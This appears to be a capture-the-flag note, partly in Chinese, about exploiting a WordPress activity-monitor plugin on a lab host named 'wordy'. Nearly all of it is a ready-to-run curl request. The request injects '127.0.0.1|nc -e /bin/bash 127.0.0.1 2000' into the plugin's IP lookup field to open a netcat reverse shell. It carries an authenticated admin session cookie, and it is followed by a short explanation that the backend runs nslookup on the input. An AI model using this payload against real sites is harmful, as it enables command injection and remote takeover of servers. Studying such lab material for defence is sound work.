curl 'http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools' -H 'Content-Type: multipart/form-data; boundary=---------------------------994444649197519837522145355' -H 'Connection: keep-alive' -H 'Cookie: wordpress_14014489b649086e51cacb340bafe656=mark%7C1600600763%7CRYuA9N2pGa7Vgggd9V6QA1tjzgFUuTgutUjmWJFOo2J%7Cff68a5099d26f4ab46d5427fba6833523d05d4bce55b4a4195012ab685ea2a6a; wp-settings-3=mfold%3Do; wp-settings-time-3=1600429350; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_14014489b649086e51cacb340bafe656=mark%7C1600600763%7CRYuA9N2pGa7Vgggd9V6QA1tjzgFUuTgutUjmWJFOo2J%7C2c6c6dcc1dfdeae1004c437fe6ffc874d4d2d0983221562f8cae6ca12f7baed0' -H 'Upgrade-Insecure-Requests: 1' --data-binary $'-----------------------------994444649197519837522145355\r\nContent-Disposition: form-data; name="ip"\r\n\r\n127.0.0.1|nc -e /bin/bash 127.0.0.1 2000\r\n-----------------------------994444649197519837522145355\r\nContent-Disposition: form-data; name="lookup"\r\n\r\nLookup\r\n-----------------------------994444649197519837522145355--\r\n'

##通过抓包或者浏览器自带的检查指令的network板块分析http报文
curl 'http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools' 
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' 
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' 
-H 'Accept-Language: en-US,en;q=0.5' 
--compressed -H 'Referer: http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools' 
-H 'Content-Type: multipart/form-data; boundary=---------------------------994444649197519837522145355' 
-H 'Connection: keep-alive' 
-H 'Cookie: wordpress_14014489b649086e51cacb340bafe656=mark%7C1600600763%7CRYuA9N2pGa7Vgggd9V6QA1tjzgFUuTgutUjmWJFOo2J%7Cff68a5099d26f4ab46d5427fba6833523d05d4bce55b4a4195012ab685ea2a6a; wp-settings-3=mfold%3Do; wp-settings-time-3=1600429350; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_14014489b649086e51cacb340bafe656=mark%7C1600600763%7CRYuA9N2pGa7Vgggd9V6QA1tjzgFUuTgutUjmWJFOo2J%7C2c6c6dcc1dfdeae1004c437fe6ffc874d4d2d0983221562f8cae6ca12f7baed0' 
-H 'Upgrade-Insecure-Requests: 1' 
--data-binary $'
-----------------------------994444649197519837522145355\r\n
Content-Disposition: form-data; name="ip"\r\n
\r\n
127.0.0.1|nc -e /bin/bash 127.0.0.1 2000\r\n '#here is command'
-----------------------------994444649197519837522145355\r\n
Content-Disposition: form-data; name="lookup"\r\n
\r\n
Lookup\r\n
-----------------------------994444649197519837522145355--\r\n
'
##可以分析到 后台会以nslookup $ip进行执行
##因此可以使用|来分割命令 产生rec